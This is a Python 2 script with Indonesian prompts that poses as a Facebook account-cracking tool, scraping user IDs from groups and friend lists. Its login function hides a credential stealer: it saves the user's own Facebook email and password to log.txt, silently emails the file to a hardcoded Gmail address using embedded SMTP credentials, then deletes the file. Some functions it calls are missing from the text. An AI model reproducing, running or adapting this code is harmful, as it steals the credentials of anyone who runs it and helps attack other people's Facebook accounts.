#!/usr/bin/python
#coding utf-8
from __future__ import print_function
import platform, os, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
if platform.python_version().split('.')[0] != '2':
	tampil('\rm[!] kamu menggunakan versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('\rm[!]SepertiNya Module \rcmechanize\rm belum di install...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm[!]Keluar')
	os.sys.exit()
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_bteman
	try:
		fid_bgroup = open(os.sys.path[0]+'/MBFbgroup.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/MBFbteman.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			tampil('\n\rm[!]Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('\rm[!]Masukan Opsinya Bro...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]Masukan dengan benar')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			tampil('\rm[!]Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			tampil('\rm[!]Pilihan tidak ada')
	return i
def kirim():
    #LOGGER 
   email_user = 'imanluqmansyah234' #EMAIL USER LOGIN
   email_password = 'iman12345' #EMAIL PASSWORD LOGIN
   email_send = 'imanluqmansyah234@gmail.com' #EMAIL UTAMA

   subject = '=== Dapat Akun Fb ==='

   msg = MIMEMultipart()
   msg['From'] = email_user
   msg['To'] = email_send
   msg['Subject'] = subject

   body = '====== AKUN FACEBOOK ======='
   msg.attach(MIMEText(body,'plain'))

   filename='log.txt'
   attachment  =open('log.txt','rb')

   part = MIMEBase('application','octet-stream')
   part.set_payload((attachment).read())
   encoders.encode_base64(part)
   part.add_header('Content-Disposition',"attachment; filename= "+filename)
    
   msg.attach(part)
   text = msg.as_string()
   try:
       server = smtplib.SMTP('smtp.gmail.com',587)
       server.starttls()
       server.login(email_user,email_password)


       server.sendmail(email_user,email_send,text)
       server.quit()
   except:
       None

def hapus():
	os.remove('log.txt')
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]Menyimpan hasil dari group')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh[!]Berhasil meyimpan \rcMBFbgroup.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
	if len(id_bteman) != 0:
		tampil('\rh[*]Menyimpan hasil daftar Teman...')
		try:
			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rh[!]Berhasil meyimpan \rcMBFbgteman.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
def buka(d):
	tampil('\rh[*]Membuka \rp'+d)
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('\rm[!]Gagal membuka \rp'+d)
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?]Email/HP')
	pa = inputD('[?]Kata Sandi')
	tampil('\rh[*]Sedang Login....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rh[*]Login Berhasil')
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
		log = 1
		z = open("log.txt","w")
		z.write("USERNAME : ")
		z.write(us)
		z.write("\n")
		z.write(" PASSWORD : ")
		z.write(pa)
		z.close()
		kirim()
		hapus()
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
		keluar()
	else:
		tampil('\rm[!]Login Gagal')

def idgroup():
        if log != 1:
                tampil('\rh[*]Login dulu bos...')
                login()
                if log == 0:
                        keluar()
        next = saring_id_group0()
        while 1:
                saring_id_group1(buka(next))
                try:
                        next = br.find_link(url_regex= '/browse/group/members/').url
                except:
                        tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
                        break
        simpan()
        i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
        if i.upper() == 'Y':
                return crack(id_bgroup)
        else:
                return menu()
def lanjutG():
        global fid_bgroup
        if len(fid_bgroup) != 0:
                i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
                if i.upper() == 'L':
                        return crack(fid_bgroup)
                else:
                        os.remove(os.sys.path[0]+'/MBFbgroup.txt')
                        fid_bgroup = []
        return 0
def menu():
	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
	i = inputM('[?]PILIH',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
		lanjutT()
		idteman()
	elif i == 3:
		keluar()
bacaData()
menu()
